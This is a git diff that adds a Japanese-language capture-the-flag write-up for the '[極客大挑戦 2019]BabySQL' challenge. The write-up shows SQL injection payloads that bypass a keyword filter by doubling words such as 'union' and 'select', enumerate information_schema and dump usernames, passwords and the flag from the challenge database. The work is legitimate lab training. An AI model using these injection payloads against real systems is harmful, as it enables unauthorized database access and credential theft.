@@ -20,6 +20,7 @@
 - [[ACTF2020 新生赛]Exec](#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bexec)
 - [[极客大挑战 2019]Http](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019http)
 - [[SUCTF 2019]CheckIn](#suctf-2019checkin)
+- [[极客大挑战 2019]BabySQL](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019babysql)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
@@ -851,4 +852,53 @@ array(5) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) ".user.ini" 
 
 ```
 GIF89a flag{8f5ae8cd-f210-4514-980d-f0eaedf4f7f3} flag{8f5ae8cd-f210-4514-980d-f0eaedf4f7f3}
+```
+
+# [极客大挑战 2019]BabySQL
+```
+username: admin
+password: 1' union select 1,2,3#
+```
+```
+Error!
+
+You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1,2,3#'' at line 1
+```
+出力が足りないのでサーバ側で入力を正規表現かなにかで弾かれています。
+
+```
+username: admin
+password: 1' ununionion seselectlect 1,2,3#
+```
+```
+Hello 2！
+
+
+Your password is '3'
+```
+```
+username: admin
+password: 1' uniunionon seleselectct 1,group_concat(table_name),group_concat(column_name) frfromom infoorrmation_schema.columns#
+```
+```
+threads,threads,users,users,users,Flag,b4bsql,b4bsql,b4bsql,geekuser,geekuser,geekuser！<
+,flag,id,username,password,id,username,password
+```
+
+```
+1' uniunionon seleselectct 1,group_concat(username),group_concat(passwoorrd) frfromom geekuser#
+```
+```html
+<p style='font-family:arial;color:#ffffff;font-size:30px;left:650px;position:absolute;'>Your password is '329404111e9961c85a030331820495d5'</p>
+```
+```
+1' uniunionon seleselectct 1,2,group_concat(flag) frfromom Flag#
+```
+FlagというテーブルがあったのでtableがFlagでcolumがflagかと思ったらうまくいきませんでした。\
+残りはb4bsqlというテーブルなのでusername,passwordを出力できるか試してみました。
+```
+1' uniunionon seleselectct 1,group_concat(username),group_concat(passwoorrd) frfromom b4bsql#
+```
+```html
+<p style='font-family:arial;color:#ffffff;font-size:30px;left:650px;position:absolute;'>Your password is 'i_want_to_play_2077,sql_injection_is_so_fun,do_you_know_pornhub,github_is_different_from_pornhub,you_found_flag_so_stop,i_told_you_to_stop,hack_by_cl4y,flag{15b7f2e9-53e8-43d8-9f20-74cdf3ac119a}'</p>
 ```
